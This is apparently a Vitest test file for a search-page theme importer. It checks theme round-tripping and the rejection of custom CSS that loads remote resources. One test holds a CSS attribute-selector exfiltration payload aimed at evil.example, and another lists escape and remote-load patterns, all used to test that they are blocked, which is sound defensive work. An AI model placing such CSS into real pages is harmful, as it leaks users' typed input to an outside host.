import { describe, expect, it } from 'vitest';
import { DEFAULT_SETTINGS, exportTheme, parseTheme, themeCssProblem } from '../src';

describe('exportTheme and parseTheme', () => {
  it('round-trips the card style, density and CSS', () => {
    const settings = { ...DEFAULT_SETTINGS, cardStyle: 'raised' as const, density: 'comfortable' as const, customCss: 'a { color: red }' };
    expect(parseTheme(exportTheme(settings))).toEqual({
      theme: { cardStyle: 'raised', density: 'comfortable', customCss: 'a { color: red }' },
    });
  });

  it.each([
    ['not JSON', '{'],
    ['another format', JSON.stringify({ format: 'other', cardStyle: 'card', density: 'compact', css: '' })],
    ['an unknown card style', JSON.stringify({ format: 'bettersearch-theme', cardStyle: 'x', density: 'compact', css: '' })],
    ['CSS that is not a string', JSON.stringify({ format: 'bettersearch-theme', cardStyle: 'card', density: 'compact', css: 1 })],
    ['null', 'null'],
  ])('rejects %s', (_, text) => {
    expect(parseTheme(text)).toEqual({ problem: 'theme.invalid' });
  });

  it('refuses a theme whose CSS could send the page out', () => {
    const text = JSON.stringify({
      format: 'bettersearch-theme',
      cardStyle: 'card',
      density: 'compact',
      css: 'input[value^="a"] { background: url(https://evil.example/?a) }',
    });
    expect(parseTheme(text)).toEqual({ problem: 'theme.remote' });
  });
});

describe('themeCssProblem', () => {
  it.each([
    'html { --bs-gap: 20px }',
    "html[data-bs-engine='bing'] .b_algo { border-radius: 4px }",
    'a { background: url(data:image/png;base64,AAAA) }',
    'a { background: url( "data:image/svg+xml,<svg/>" ) }',
    '/* url(https://x) in a comment */ a { color: red }',
    '@font-face { font-family: X; src: local("Arial") }',
  ])('allows %s', (css) => {
    expect(themeCssProblem(css)).toBeNull();
  });

  it.each([
    ['@import url(https://x/a.css);', 'theme.remote'],
    ['@IMPORT "https://x/a.css";', 'theme.remote'],
    ['a { background: url(https://x/p) }', 'theme.remote'],
    ["a { background: URL('//x/p') }", 'theme.remote'],
    ['a { background: url(/p) }', 'theme.remote'],
    ['a { background: image-set("https://x/p" 1x) }', 'theme.remote'],
    ['a { background: src("https://x/p") }', 'theme.remote'],
    ['a { background: \\75 rl(https://x/p) }', 'theme.escape'],
  ] as const)('refuses %s', (css, problem) => {
    expect(themeCssProblem(css)).toBe(problem);
  });
});
